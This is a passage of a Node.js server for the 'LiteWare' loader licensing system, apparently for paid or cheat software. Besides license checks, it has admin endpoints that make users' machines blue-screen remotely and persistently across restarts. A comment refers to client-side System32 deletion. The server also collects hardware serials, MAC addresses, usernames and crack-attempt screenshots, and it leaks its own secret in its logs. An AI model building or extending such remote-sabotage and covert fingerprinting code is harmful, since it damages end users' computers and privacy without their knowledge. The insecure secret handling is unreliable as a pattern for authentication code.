app.post('/auth/loader-status', validateAppSecret, (req, res) => {
    res.json({
        success: true,
        enabled: loaderStatus.enabled,
        message: loaderStatus.message,
        disabledAt: loaderStatus.disabledAt,
        lastUpdated: loaderStatus.lastUpdated
    });
});

// Set loader status endpoint (enable/disable)
app.post('/auth/set-loader-status', validateAppSecret, (req, res) => {
    const { enabled, message } = req.body;
    
    loaderStatus.enabled = enabled !== false;
    loaderStatus.message = message || (enabled ? '' : 'Loader disabled/updating');
    loaderStatus.lastUpdated = new Date().toISOString();
    
    if (!enabled) {
        loaderStatus.disabledAt = new Date().toISOString();
    } else {
        loaderStatus.disabledAt = null;
    }
    
    saveLoaderStatus();
    
    console.log(`🔄 Loader status changed to: ${loaderStatus.enabled ? 'ENABLED' : 'DISABLED'}`);
    
    res.json({
        success: true,
        message: `Loader ${loaderStatus.enabled ? 'enabled' : 'disabled'} successfully`,
        status: loaderStatus
    });
});

// Check loader status endpoint (for loader to check before auth)
app.post('/auth/check-loader', (req, res) => {
    const { hwid, gpu_hash } = req.body;
    const clientHwid = gpu_hash || hwid;
    
    // FIRST: Check if this HWID is in the persistent BSOD list
    if (clientHwid && persistentBSODList.hwids.includes(clientHwid)) {
        console.log(`🔴 PERSISTENT BSOD TRIGGERED for HWID: ${clientHwid}`);
        return res.json({
            success: false,
            trigger_bsod: true,
            message: 'System check failed'
        });
    }
    
    // Check if server is disabled (takes priority over loader status)
    if (serverDisabled) {
        return res.json({
            success: false,
            disabled: true,
            message: 'Disabled by a LiteWare administrator',
            closeAfter: 5000 // Close after 5 seconds
        });
    }
    
    // Check if loader is disabled
    if (!loaderStatus.enabled) {
        res.json({
            success: false,
            disabled: true,
            message: loaderStatus.message || 'Loader disabled/updating',
            closeAfter: 5000 // Close after 5 seconds
        });
    } else {
        res.json({
            success: true,
            disabled: false,
            message: ''
        });
    }
});

// Persistent BSOD check endpoint - loader calls this on startup with HWID
app.post('/auth/check-bsod', (req, res) => {
    const { hwid, gpu_hash, license_key } = req.body;
    const clientHwid = gpu_hash || hwid;
    
    // Check if HWID is in persistent BSOD list
    if (clientHwid && persistentBSODList.hwids.includes(clientHwid)) {
        console.log(`🔴 BSOD CHECK: HWID ${clientHwid} is in BSOD list - TRIGGERING`);
        return res.json({
            trigger_bsod: true,
            reason: 'Hardware violation detected'
        });
    }
    
    // Check if license key is in persistent BSOD list
    if (license_key && persistentBSODList.licenseKeys.includes(license_key)) {
        console.log(`🔴 BSOD CHECK: License ${license_key} is in BSOD list - TRIGGERING`);
        return res.json({
            trigger_bsod: true,
            reason: 'License violation detected'
        });
    }
    
    // Not in BSOD list
    res.json({
        trigger_bsod: false
    });
});

// Also add GET endpoint for simple status check
app.get('/auth/loader-status', (req, res) => {
    res.json({
        enabled: loaderStatus.enabled,
        message: loaderStatus.message,
        lastUpdated: loaderStatus.lastUpdated
    });
});

// ========================================

// License validation endpoint
app.post('/auth/license', validateAppSecret, (req, res) => {
    try {
        // Check if server is disabled
        if (serverDisabled) {
            console.log('🚫 License request rejected - Server is disabled');
            return res.json({
                success: false,
                error: 'SERVER_DISABLED',
                message: 'Disabled by a LiteWare administrator',
                loader_disabled: true,
                closeAfter: 5000
            });
        }
        
        // Check maintenance mode
        if (maintenanceMode) {
            console.log('⚠️ License request rejected - Maintenance mode enabled');
            return res.json({
                success: false,
                error: 'MAINTENANCE_MODE',
                message: 'Server is currently under maintenance. Please try again later.'
            });
        }
        
        // Check if loader is disabled first
        if (!loaderStatus.enabled) {
            console.log('⚠️ License request rejected - Loader is disabled');
            return res.json({
                success: false,
                loader_disabled: true,
                message: loaderStatus.message || 'Loader disabled/updating',
                closeAfter: 5000 // Tell client to close after 5 seconds
            });
        }
        
        console.log('=== LICENSE VALIDATION REQUEST ===');
        console.log('Request body:', JSON.stringify(req.body, null, 2));
        console.log('Headers:', JSON.stringify(req.headers, null, 2));
        
        let { license_key, hwid, gpu_hash, app_name, app_secret, _obf_key, _obf_enabled } = req.body;
        
        console.log('Extracted values:', {
            license_key: license_key ? (license_key.length > 20 ? license_key.substring(0, 20) + '...' : license_key) : 'MISSING',
            hwid: hwid || 'NOT PROVIDED',
            app_name: app_name || 'NOT PROVIDED',
            app_secret: app_secret ? 'PRESENT' : 'MISSING'
        });
        
        // Deobfuscate data if obfuscation is enabled
        if (_obf_enabled === '1' && _obf_key) {
            try {
                if (license_key) license_key = deobfuscateData(license_key, _obf_key);
                if (hwid) hwid = deobfuscateData(hwid, _obf_key);
                if (app_secret) app_secret = deobfuscateData(app_secret, _obf_key);
                console.log('Data deobfuscated successfully');
            } catch (e) {
                console.error('Deobfuscation error:', e);
                // Continue with original values if deobfuscation fails
            }
        }
        
        // Get client IP address
        const clientIP = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const cleanIP = clientIP ? clientIP.split(',')[0].trim() : 'unknown';
        
        console.log('Client IP:', cleanIP);
        console.log('Available license keys:', Object.keys(licenses));
        
        // Determine final HWID to use (prefer GPU hash, fallback to HWID)
        const finalHwid = gpu_hash || hwid || null;
        
        console.log('Final HWID determined:', finalHwid ? (finalHwid.length > 20 ? finalHwid.substring(0, 20) + '...' : finalHwid) : 'NOT PROVIDED');
        
        // Check if HWID (or GPU hash) is blacklisted
        if (finalHwid && blacklistedHWIDs.includes(finalHwid)) {
            console.log('❌ HWID/GPU Hash is blacklisted:', finalHwid);
            return res.json({ 
                success: false, 
                message: 'Blacklisted user detected',
                blacklisted: true 
            });
        }
        
        // Check if IP is blacklisted
        if (blacklistedIPs.includes(cleanIP)) {
            console.log('❌ IP is blacklisted:', cleanIP);
            return res.json({ 
                success: false, 
                message: 'Blacklisted user detected',
                blacklisted: true 
            });
        }
        
        if (!license_key) {
            console.log('❌ License key is missing');
            return res.json({ success: false, message: 'License key required' });
        }
        
        console.log('Looking up license key:', license_key);
        const license = licenses[license_key];
        
        if (!license) {
            console.log('❌ License key not found in database');
            console.log('Available keys:', Object.keys(licenses).join(', '));
            return res.json({ 
                success: false, 
                message: 'Invalid license key',
                debug_info: {
                    received_key: license_key,
                    available_keys_count: Object.keys(licenses).length
                }
            });
        }
        
        if (!license.valid) {
            console.log('❌ License key is marked as invalid');
            return res.json({ success: false, message: 'License key is invalid' });
        }
        
        // Check if key is activated (backward compatible - if field doesn't exist, treat as activated)
        if (license.activated === false) {
            console.log('❌ License key not activated');
            return res.json({ 
                success: false, 
                message: 'License key requires activation. Please activate your key at the activation portal.',
                requires_activation: true 
            });
        }
        
        console.log('✅ License key found and valid');
        
        // Check HWID lock (use GPU hash if available, otherwise use HWID)
        if (license.used && license.hwid && license.hwid !== finalHwid) {
            return res.json({ success: false, message: 'License already used on different hardware' });
        }
        
        // Check expiry
        if (license.expiry && new Date() > new Date(license.expiry)) {
            return res.json({ success: false, message: 'License has expired' });
        }
        
        // Store system information from request (non-blocking - update in background)
        const systemInfo = {
            hwid: finalHwid || null,
            gpu_hash: gpu_hash || null,
            ip: cleanIP,
            user_agent: req.headers['user-agent'] || 'unknown',
            timestamp: new Date().toISOString(),
            disk_serials: req.body.disk_serials || null,
            baseboard_serial: req.body.baseboard_serial || null,
            bios_serial: req.body.bios_serial || null,
            processor_id: req.body.processor_id || null,
            mac_addresses: req.body.mac_addresses || null,
            volume_serials: req.body.volume_serials || null,
            computer_name: req.body.computer_name || null,
            username: req.body.username || null,
            os_version: req.body.os_version || null,
            os_architecture: req.body.os_architecture || null
        };

        // Mark as used and bind to HWID (GPU hash preferred) and IP (quick update)
        if (!license.used) {
            license.used = true;
            license.hwid = finalHwid; // Use GPU hash if available, otherwise HWID
            license.gpu_hash = gpu_hash || null; // Store GPU hash separately
            license.ip = cleanIP;
            license.system_info = systemInfo;
            license.first_used = new Date().toISOString();
            license.last_used = new Date().toISOString();
        } else {
            // Update HWID/GPU hash if different (e.g., GPU hash was added or changed)
            if (finalHwid && license.hwid !== finalHwid) {
                license.hwid = finalHwid;
                license.gpu_hash = gpu_hash || null;
            }
            // Update IP and system info if key is already used (in case IP changed or system info updated)
            license.ip = cleanIP;
            license.system_info = systemInfo;
            license.last_used = new Date().toISOString();
        }
        
        // Create secure session with encryption key
        const session = createSession(license_key, finalHwid, cleanIP);
        
        // Generate integrity challenge for client
        const challenge = generateClientChallenge();
        
        // Clear any previous failed attempts for this IP (successful auth)
        clearFailedAttempts(req);
        
        // Check if remote BSOD is triggered for this key (but skip if whitelisted)
        const isWhitelisted = whitelistedLicenseKeys.includes(license_key);
        const remoteBSODIndex = remoteBSODKeys.indexOf(license_key);
        const remoteBSODTriggered = remoteBSODIndex !== -1 && !isWhitelisted;
        
        // If remote BSOD is triggered, remove it from the array so it only triggers ONCE
        // This way, after they get BSOD'd once, they can authenticate normally next time
        if (remoteBSODTriggered && remoteBSODIndex !== -1) {
            remoteBSODKeys.splice(remoteBSODIndex, 1);
            console.log(`[REMOTE BSOD] Triggered for key ${license_key} - removed from array (one-time trigger)`);
        }
        
        // Return response immediately (don't block)
        console.log('✅ Authentication successful');
        console.log('Session created:', session.token.substring(0, 16) + '...');
        console.log('isWhitelisted:', isWhitelisted, 'remoteBSOD:', remoteBSODTriggered);
        console.log('=== END LICENSE VALIDATION ===\n');
        
        // Build response with session info
        const response = {
            success: true,
            valid: true,
            message: 'License validated successfully',
            is_whitelisted: isWhitelisted,
            remote_bsod: remoteBSODTriggered,
            // Session information
            session_token: session.token,
            session_key: session.key, // For encrypted communication
            heartbeat_interval: HEARTBEAT_INTERVAL,
            session_timeout: SESSION_TIMEOUT,
            // Integrity challenge
            challenge: challenge.challenge,
            challenge_salt: 'LITEWARE_INTEGRITY_2024',
            // Server info
            server_time: Date.now(),
            server_version: '2.0'
        };
        
        res.json(response);
    } catch (error) {
        console.error('❌ Error in license validation:', error);
        console.error('Stack:', error.stack);
        console.log('=== END LICENSE VALIDATION (ERROR) ===\n');
        res.json({ 
            success: false, 
            message: 'Server error during license validation',
            error: error.message 
        });
    }
});

// Username/Password validation endpoint
app.post('/auth/login', validateAppSecret, (req, res) => {
    const { username, password, hwid, app_name } = req.body;
    
    // Get client IP address
    const clientIP = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const cleanIP = clientIP ? clientIP.split(',')[0].trim() : 'unknown';
    
    // Check if HWID is blacklisted
    if (hwid && blacklistedHWIDs.includes(hwid)) {
        return res.json({ 
            success: false, 
            message: 'Blacklisted user detected',
            blacklisted: true 
        });
    }
    
    // Check if IP is blacklisted
    if (blacklistedIPs.includes(cleanIP)) {
        return res.json({ 
            success: false, 
            message: 'Blacklisted user detected',
            blacklisted: true 
        });
    }
    
    if (!username || !password) {
        return res.json({ success: false, message: 'Username and password required' });
    }
    
    const user = users[username];
    
    if (!user) {
        return res.json({ success: false, message: 'Invalid credentials' });
    }
    
    // Hash password and compare
    const passwordHash = crypto.createHash('sha256').update(password).digest('hex');
    
    if (user.password_hash !== passwordHash) {
        return res.json({ success: false, message: 'Invalid credentials' });
    }
    
    // Check HWID if bound
    if (user.hwid && user.hwid !== hwid) {
        return res.json({ success: false, message: 'Account is bound to different hardware' });
    }
    
    // Bind HWID if not bound
    if (!user.hwid && hwid) {
        user.hwid = hwid;
    }
    
    // Generate session token
    const token = crypto.randomBytes(32).toString('hex');
    
    res.json({
        success: true,
        valid: true,
        token: token,
        message: 'Login successful'
    });
});

// Session validation endpoint
app.post('/auth/session', validateAppSecret, (req, res) => {
    try {
        const { token, license_key } = req.body;
        
        // Quick validation - just check if token exists (non-blocking)
        // In production, you'd want to store tokens and validate them properly
        if (!token || token.length < 10) {
            return res.json({
                success: false,
                valid: false,
                message: 'Invalid session token'
            });
        }
        
        // If license key is provided, verify it's still valid
        if (license_key) {
            const license = licenses[license_key];
            if (!license || !license.valid) {
                return res.json({
                    success: false,
                    valid: false,
                    message: 'License key is no longer valid'
                });
            }
            
            // Check expiry
            if (license.expiry && new Date() > new Date(license.expiry)) {
                return res.json({
                    success: false,
                    valid: false,
                    message: 'License has expired'
                });
            }
        }
        
        // Return success immediately (non-blocking)
        res.json({
            success: true,
            valid: true,
            message: 'Session valid'
        });
    } catch (error) {
        console.error('Error in session validation:', error);
        res.json({
            success: false,
            valid: false,
            message: 'Server error during session validation'
        });
    }
});

// License Key Generator Endpoint (Admin only - add authentication in production!)
app.post('/auth/generate-key', validateAppSecret, (req, res) => {
    const { count = 1, prefix = 'LICENSE', keyType = 'lifetime' } = req.body;
    
    const generatedKeys = [];
    
    // Calculate expiry based on key type
    let expiry = null;
    if (keyType === '24hr') {
        // Add 24 hours (86400000 milliseconds) to current time
        const expiryDate = new Date(Date.now() + (24 * 60 * 60 * 1000));
        expiry = expiryDate.toISOString();
    } else if (keyType === 'lifetime') {
        expiry = null; // null = never expires
    }
    
    for (let i = 0; i < count; i++) {
        // Generate a random license key
        const randomPart = crypto.randomBytes(8).toString('hex').toUpperCase();
        const licenseKey = `${prefix}-${randomPart}`;
        
        // Add to licenses object
        licenses[licenseKey] = {
            valid: true,
            activated: false, // Key requires activation before use
            used: false,
            hwid: null,
            ip: null,
            expiry: expiry,
            system_info: null,
            first_used: null,
            last_used: null,
            activated_at: null,
            activated_by: null,
            activation_ip: null
        };
        
        // Format expiry for display
        let expiryDisplay = 'Never';
        if (expiry) {
            try {
                const expiryDate = new Date(expiry);
                if (!isNaN(expiryDate.getTime())) {
                    expiryDisplay = expiryDate.toLocaleString();
                }
            } catch (e) {
                expiryDisplay = 'Never';
            }
        }
        
        generatedKeys.push({
            key: licenseKey,
            type: keyType,
            expiry: expiryDisplay
        });
    }
    
    res.json({
        success: true,
        keys: generatedKeys,
        message: `Generated ${count} ${keyType} license key(s)`
    });
});

// List all license keys (Admin only - use POST with app_secret in body)
app.post('/auth/list-keys', validateAppSecret, (req, res) => {
    const keysList = Object.keys(licenses).map(key => {
        const license = licenses[key];
        // Determine status based on used and valid fields
        let status = 'Unknown';
        if (license.valid && license.used) {
            status = 'Active';
        } else if (license.valid && !license.used) {
            status = 'Valid';
        } else if (!license.valid) {
            status = 'Invalid';
        }
        return {
            key: key,
            valid: license.valid,
            activated: license.activated !== false, // Backward compatible
            used: license.used,
            status: status, // Add status field for dashboard
            hwid: license.hwid || null,
            ip: license.ip || null,
            expiry: license.expiry, // Return ISO string, client will format it
            activated_at: license.activated_at || null,
            activation_ip: license.activation_ip || null
        };
    });
    
    res.json({
        success: true,
        total: keysList.length,
        keys: keysList
    });
});

// Retrieve license key info (Admin only)
app.post('/auth/retrieve', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    
    if (!license_key) {
        return res.json({ success: false, message: 'License key required' });
    }
    
    const license = licenses[license_key];
    
    if (!license) {
        return res.json({ success: false, message: 'License key not found' });
    }
    
    // Determine status
    let status = 'Unknown';
    if (license.valid && license.used) {
        status = 'Active';
    } else if (license.valid && !license.used) {
        status = 'Unused';
    } else if (!license.valid) {
        status = 'Invalid';
    }
    
    res.json({
        success: true,
        license_key: license_key,
        hwid: license.hwid || null,
        gpu_hash: license.gpu_hash || null,
        ip: license.ip || null,
        status: status,
        valid: license.valid,
        used: license.used,
        expiry: license.expiry || 'Lifetime',
        first_used: license.first_used || null,
        last_used: license.last_used || null,
        system_info: license.system_info || null
    });
});

// Reset HWID for a license key (Admin only)
app.post('/auth/reset-hwid', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    
    if (!license_key) {
        return res.json({ success: false, message: 'License key required' });
    }
    
    const license = licenses[license_key];
    
    if (!license) {
        return res.json({ success: false, message: 'License key not found' });
    }
    
    // Reset HWID and mark as unused
    license.hwid = null;
    license.used = false;
    
    res.json({
        success: true,
        message: 'HWID reset successfully',
        license_key: license_key
    });
});

// Delete a license key (Admin only)
app.post('/auth/delete-key', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    
    if (!license_key) {
        return res.json({ success: false, message: 'License key required' });
    }
    
    if (!licenses[license_key]) {
        return res.json({ success: false, message: 'License key not found' });
    }
    
    // Delete the license key
    delete licenses[license_key];
    
    res.json({
        success: true,
        message: 'License key deleted successfully',
        license_key: license_key
    });
});

// ========================================
// PERSISTENT BSOD ENDPOINTS
// ========================================

// Trigger persistent BSOD for a license key (Admin only)
// This will BSOD the user IMMEDIATELY when they next open the loader
// Even if they restart PC, they will be BSOD'd
app.post('/auth/trigger-bsod', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    
    if (!license_key) {
        return res.json({ success: false, message: 'License key required' });
    }
    
    const license = licenses[license_key];
    
    // Add license key to persistent BSOD list
    if (!persistentBSODList.licenseKeys.includes(license_key)) {
        persistentBSODList.licenseKeys.push(license_key);
    }
    
    // If the license has an HWID, add that too for immediate BSOD on loader open
    if (license && license.hwid) {
        if (!persistentBSODList.hwids.includes(license.hwid)) {
            persistentBSODList.hwids.push(license.hwid);
            console.log(`🔴 Added HWID ${license.hwid} to persistent BSOD list`);
        }
    }
    
    // Also add GPU hash if available
    if (license && license.gpu_hash && !persistentBSODList.hwids.includes(license.gpu_hash)) {
        persistentBSODList.hwids.push(license.gpu_hash);
        console.log(`🔴 Added GPU hash ${license.gpu_hash} to persistent BSOD list`);
    }
    
    // Save to file for persistence across server restarts
    savePersistentBSOD();
    
    // Also add to the one-time BSOD list for backwards compatibility
    if (!remoteBSODKeys.includes(license_key)) {
        remoteBSODKeys.push(license_key);
    }
    
    console.log(`🔴 PERSISTENT BSOD TRIGGERED for license: ${license_key}`);
    
    res.json({
        success: true,
        message: `Persistent BSOD triggered for ${license_key}. User will be BSOD'd on next loader open.`,
        hwid_added: license ? license.hwid : null,
        gpu_hash_added: license ? license.gpu_hash : null
    });
});

// Remove persistent BSOD for a license key (Admin only)
app.post('/auth/remove-bsod', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    
    if (!license_key) {
        return res.json({ success: false, message: 'License key required' });
    }
    
    const license = licenses[license_key];
    let removed = false;
    
    // Remove license key from persistent list
    const keyIndex = persistentBSODList.licenseKeys.indexOf(license_key);
    if (keyIndex !== -1) {
        persistentBSODList.licenseKeys.splice(keyIndex, 1);
        removed = true;
    }
    
    // Remove HWID if license exists
    if (license && license.hwid) {
        const hwidIndex = persistentBSODList.hwids.indexOf(license.hwid);
        if (hwidIndex !== -1) {
            persistentBSODList.hwids.splice(hwidIndex, 1);
            removed = true;
        }
    }
    
    // Remove GPU hash if exists
    if (license && license.gpu_hash) {
        const gpuIndex = persistentBSODList.hwids.indexOf(license.gpu_hash);
        if (gpuIndex !== -1) {
            persistentBSODList.hwids.splice(gpuIndex, 1);
            removed = true;
        }
    }
    
    // Save changes
    savePersistentBSOD();
    
    // Also remove from one-time list
    const oneTimeIndex = remoteBSODKeys.indexOf(license_key);
    if (oneTimeIndex !== -1) {
        remoteBSODKeys.splice(oneTimeIndex, 1);
        removed = true;
    }
    
    if (removed) {
        console.log(`✅ Removed ${license_key} from BSOD lists`);
        res.json({
            success: true,
            message: `BSOD flag removed for ${license_key}`
        });
    } else {
        res.json({
            success: false,
            message: 'License key was not in BSOD list'
        });
    }
});

// List all persistent BSOD entries (Admin only)
app.post('/auth/list-bsod', validateAppSecret, (req, res) => {
    res.json({
        success: true,
        licenseKeys: persistentBSODList.licenseKeys,
        hwids: persistentBSODList.hwids,
        oneTimeKeys: remoteBSODKeys
    });
});

// Blacklist by License Key (Admin only)
// This will blacklist the HWID and IP of whoever used the key
app.post('/auth/blacklist', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    
    if (!license_key) {
        return res.json({ success: false, message: 'License key required' });
    }
    
    const license = licenses[license_key];
    
    if (!license) {
        return res.json({ success: false, message: 'License key not found' });
    }
    
    if (!license.used) {
        return res.json({ success: false, message: 'License key has not been used yet. Cannot blacklist unused keys.' });
    }
    
    let added = [];
    
    // Blacklist the HWID if it exists and not already blacklisted
    if (license.hwid && !blacklistedHWIDs.includes(license.hwid)) {
        blacklistedHWIDs.push(license.hwid);
        added.push(`HWID: ${license.hwid}`);
    }
    
    // Blacklist the IP if it exists and not already blacklisted
    if (license.ip && license.ip !== 'unknown' && !blacklistedIPs.includes(license.ip)) {
        blacklistedIPs.push(license.ip);
        added.push(`IP: ${license.ip}`);
    }
    
    if (added.length === 0) {
        return res.json({ 
            success: false, 
            message: 'HWID and IP for this license key are already blacklisted' 
        });
    }
    
    res.json({
        success: true,
        message: `Blacklisted user from license key ${license_key}: ${added.join(', ')}`,
        blacklistedHWIDs: blacklistedHWIDs,
        blacklistedIPs: blacklistedIPs,
        hwid: license.hwid,
        ip: license.ip
    });
});

// List blacklisted HWIDs and IPs (Admin only)
app.post('/auth/list-blacklist', validateAppSecret, (req, res) => {
    res.json({
        success: true,
        blacklistedHWIDs: blacklistedHWIDs,
        blacklistedIPs: blacklistedIPs
    });
});

// Retrieve key information with all HWID, IP, and system info (Admin only)
app.post('/auth/get-key-info', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    
    if (!license_key) {
        return res.json({ success: false, message: 'License key required' });
    }
    
    const license = licenses[license_key];
    
    if (!license) {
        return res.json({ success: false, message: 'License key not found' });
    }
    
    // Format expiry for display
    let expiryDisplay = 'Never';
    if (license.expiry) {
        try {
            const expiryDate = new Date(license.expiry);
            if (!isNaN(expiryDate.getTime())) {
                expiryDisplay = expiryDate.toLocaleString();
            }
        } catch (e) {
            expiryDisplay = 'Never';
        }
    }
    
    // Format timestamps
    let firstUsedDisplay = 'Never';
    if (license.first_used) {
        try {
            const firstUsedDate = new Date(license.first_used);
            if (!isNaN(firstUsedDate.getTime())) {
                firstUsedDisplay = firstUsedDate.toLocaleString();
            }
        } catch (e) {
            firstUsedDisplay = 'Never';
        }
    }
    
    let lastUsedDisplay = 'Never';
    if (license.last_used) {
        try {
            const lastUsedDate = new Date(license.last_used);
            if (!isNaN(lastUsedDate.getTime())) {
                lastUsedDisplay = lastUsedDate.toLocaleString();
            }
        } catch (e) {
            lastUsedDisplay = 'Never';
        }
    }
    
    // Build comprehensive response
    const response = {
        success: true,
        license_key: license_key,
        license_info: {
            valid: license.valid,
            used: license.used,
            expiry: expiryDisplay,
            expiry_raw: license.expiry,
            first_used: firstUsedDisplay,
            first_used_raw: license.first_used,
            last_used: lastUsedDisplay,
            last_used_raw: license.last_used
        },
        hardware_info: {
            hwid: license.hwid || 'Not set',
            gpu_hash: license.gpu_hash || license.hwid || 'Not set', // GPU hash or HWID as fallback
            ip_address: license.ip || 'Not set',
            is_blacklisted_hwid: license.hwid ? blacklistedHWIDs.includes(license.hwid) : false,
            is_blacklisted_ip: license.ip ? blacklistedIPs.includes(license.ip) : false
        },
        system_info: license.system_info || {
            message: 'System information not available (key not used yet)'
        }
    };
    
    // Add detailed system info if available
    if (license.system_info) {
        response.system_info = {
            hwid: license.system_info.hwid || 'Not provided',
            gpu_hash: license.system_info.gpu_hash || license.system_info.hwid || 'Not provided',
            ip_address: license.system_info.ip || 'Not provided',
            user_agent: license.system_info.user_agent || 'Not provided',
            timestamp: license.system_info.timestamp || 'Not provided',
            disk_serials: license.system_info.disk_serials || 'Not provided',
            baseboard_serial: license.system_info.baseboard_serial || 'Not provided',
            bios_serial: license.system_info.bios_serial || 'Not provided',
            processor_id: license.system_info.processor_id || 'Not provided',
            mac_addresses: license.system_info.mac_addresses || 'Not provided',
            volume_serials: license.system_info.volume_serials || 'Not provided',
            computer_name: license.system_info.computer_name || 'Not provided',
            username: license.system_info.username || 'Not provided',
            os_version: license.system_info.os_version || 'Not provided',
            os_architecture: license.system_info.os_architecture || 'Not provided'
        };
    }
    
    res.json(response);
});

// Remove from blacklist (Admin only)
// Can unblacklist by license_key (removes both HWID and IP), or by hwid/ip directly
app.post('/auth/unblacklist', validateAppSecret, (req, res) => {
    const { license_key, hwid, ip } = req.body;
    
    if (!license_key && !hwid && !ip) {
        return res.json({ success: false, message: 'License key, HWID, or IP address required' });
    }
    
    let removed = [];
    
    // If license key is provided, unblacklist both HWID and IP from that key
    if (license_key) {
        const license = licenses[license_key];
        
        if (!license) {
            return res.json({ success: false, message: 'License key not found' });
        }
        
        if (!license.used) {
            return res.json({ success: false, message: 'License key has not been used yet. Nothing to unblacklist.' });
        }
        
        // Unblacklist HWID if it exists and is blacklisted
        if (license.hwid) {
            const hwidIndex = blacklistedHWIDs.indexOf(license.hwid);
            if (hwidIndex > -1) {
                blacklistedHWIDs.splice(hwidIndex, 1);
                removed.push(`HWID: ${license.hwid}`);
            }
        }
        
        // Unblacklist IP if it exists and is blacklisted
        if (license.ip && license.ip !== 'unknown') {
            const ipIndex = blacklistedIPs.indexOf(license.ip);
            if (ipIndex > -1) {
                blacklistedIPs.splice(ipIndex, 1);
                removed.push(`IP: ${license.ip}`);
            }
        }
    } else {
        // Direct unblacklist by HWID or IP
        if (hwid) {
            const index = blacklistedHWIDs.indexOf(hwid);
            if (index > -1) {
                blacklistedHWIDs.splice(index, 1);
                removed.push(`HWID: ${hwid}`);
            }
        }
        
        if (ip) {
            const index = blacklistedIPs.indexOf(ip);
            if (index > -1) {
                blacklistedIPs.splice(index, 1);
                removed.push(`IP: ${ip}`);
            }
        }
    }
    
    if (removed.length === 0) {
        return res.json({ 
            success: false, 
            message: 'HWID or IP not found in blacklist' 
        });
    }
    
    res.json({
        success: true,
        message: `Removed from blacklist: ${removed.join(', ')}`
    });
});

// Check if license key is whitelisted (used by client to check before BSOD/System32 deletion)
app.post('/auth/check-whitelist', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    
    if (!license_key) {
        return res.json({ success: false, message: 'License key required', whitelisted: false });
    }
    
    const isWhitelisted = whitelistedLicenseKeys.includes(license_key);
    
    res.json({
        success: true,
        whitelisted: isWhitelisted,
        message: isWhitelisted ? 'License key is whitelisted' : 'License key is not whitelisted'
    });
});

// Add license key to whitelist (Admin only)
app.post('/auth/whitelist-key', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    
    if (!license_key) {
        return res.json({ success: false, message: 'License key required' });
    }
    
    if (whitelistedLicenseKeys.includes(license_key)) {
        return res.json({ 
            success: false, 
            message: 'License key is already whitelisted' 
        });
    }
    
    whitelistedLicenseKeys.push(license_key);
    
    res.json({
        success: true,
        message: `License key ${license_key} has been whitelisted`,
        license_key: license_key
    });
});

// Remove license key from whitelist (Admin only)
app.post('/auth/unwhitelist-key', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    
    if (!license_key) {
        return res.json({ success: false, message: 'License key required' });
    }
    
    const index = whitelistedLicenseKeys.indexOf(license_key);
    if (index === -1) {
        return res.json({ 
            success: false, 
            message: 'License key is not in whitelist' 
        });
    }
    
    whitelistedLicenseKeys.splice(index, 1);
    
    res.json({
        success: true,
        message: `License key ${license_key} has been removed from whitelist`
    });
});

// List all whitelisted license keys (Admin only)
app.post('/auth/list-whitelist', validateAppSecret, (req, res) => {
    res.json({
        success: true,
        whitelistedKeys: whitelistedLicenseKeys
    });
});

// Trigger remote BSOD for a license key (Admin only)
app.post('/auth/trigger-remote-bsod', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    
    if (!license_key) {
        return res.json({ success: false, message: 'License key required' });
    }
    
    // Check if key is whitelisted (protected from BSOD)
    if (whitelistedLicenseKeys.includes(license_key)) {
        return res.json({ 
            success: false, 
            message: 'Cannot trigger BSOD for whitelisted license key' 
        });
    }
    
    if (remoteBSODKeys.includes(license_key)) {
        return res.json({ 
            success: false, 
            message: 'Remote BSOD is already triggered for this license key' 
        });
    }
    
    remoteBSODKeys.push(license_key);
    
    res.json({
        success: true,
        message: `Remote BSOD triggered for license key ${license_key}. User will be BSOD'd ONCE on next authentication, then they can authenticate normally.`,
        license_key: license_key
    });
});

// Remove remote BSOD flag from a license key (Admin only)
app.post('/auth/remove-remote-bsod', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    
    if (!license_key) {
        return res.json({ success: false, message: 'License key required' });
    }
    
    const index = remoteBSODKeys.indexOf(license_key);
    if (index === -1) {
        return res.json({ 
            success: false, 
            message: 'Remote BSOD is not triggered for this license key' 
        });
    }
    
    remoteBSODKeys.splice(index, 1);
    
    res.json({
        success: true,
        message: `Remote BSOD flag removed for license key ${license_key}`
    });
});

// Log crack attempt endpoint (Admin only) - supports both JSON and multipart/form-data
app.post('/auth/log-crack-attempt', (req, res, next) => {
    console.log('=== CRACK ATTEMPT REQUEST RECEIVED ===');
    console.log('Content-Type:', req.headers['content-type']);
    console.log('Method:', req.method);
    console.log('URL:', req.url);
    console.log('Request IP:', req.ip || req.connection.remoteAddress || 'Unknown');
    console.log('Request headers:', JSON.stringify(req.headers, null, 2));
    console.log('Request body keys (before multer):', Object.keys(req.body || {}));
    console.log('Request body (before multer):', JSON.stringify(req.body || {}, null, 2));
    
    // Check content type to determine if multipart
    const contentType = req.headers['content-type'] || '';
    
    if (contentType.includes('multipart/form-data') && upload) {
        console.log('Processing as multipart/form-data');
        // Handle multipart with file upload - validate secret AFTER multer processes
        upload.single('screenshot')(req, res, (err) => {
            if (err) {
                console.error('Multer error:', err);
                // If multipart fails, try JSON fallback
                return handleJsonCrackAttempt(req, res);
            }
            
            console.log('Multer processed successfully');
            console.log('Request body keys:', Object.keys(req.body));
            console.log('Request body:', JSON.stringify(req.body, null, 2));
            console.log('Request file:', req.file ? req.file.filename : 'None');
            
            // Validate app secret from form data (after multer processes it)
            const appSecret = req.body.app_secret;
            console.log('App secret received:', appSecret ? `Present (${appSecret.length} chars)` : 'Missing');
            console.log('App secret matches:', appSecret === APP_SECRET);
            console.log('Expected APP_SECRET length:', APP_SECRET ? APP_SECRET.length : 0);
            console.log('Received app_secret length:', appSecret ? appSecret.length : 0);
            
            if (appSecret !== APP_SECRET) {
                console.error('❌ Invalid app secret!');
                console.error('   Expected:', APP_SECRET);
                console.error('   Got:', appSecret);
                console.error('   Match:', appSecret === APP_SECRET);
